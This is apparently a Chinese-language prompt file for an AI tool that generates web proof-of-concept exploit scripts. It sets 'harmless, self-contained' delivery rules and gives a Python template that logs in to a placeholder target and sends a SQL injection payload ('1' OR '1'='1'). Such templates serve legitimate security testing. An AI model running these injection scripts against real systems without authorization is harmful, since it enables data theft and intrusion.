---
description: 方案生成 - 生成完整 POC
---

# Web POC 生成器 (POC Generator)

生成用于复现业务逻辑漏洞或注入的脚本。

## 交付标准

1.  **无害化**: 必须证明影响但**不可**破坏生产数据 (e.g. 不要 DELETE，而是 SELECT)。
2.  **自包含**: 包含 Session/Token 获取逻辑，单文件可运行。

## 模板 (Python)

```python
import requests
import sys

TARGET = "http://target.com"

def exploit():
    s = requests.Session()
    # 1. Login / Get Token
    s.post(f"{TARGET}/login", data={"user": "test", "pass": "test"})
    
    # 2. Trigger Vulnerability
    payload = {"id": "1' OR '1'='1"}
    r = s.get(f"{TARGET}/api/data", params=payload)
    
    # 3. Verify
    if "admin_data" in r.text:
        print("[+] Vulnerable!")
    else:
        print("[-] Failed")

if __name__ == "__main__":
    exploit()
```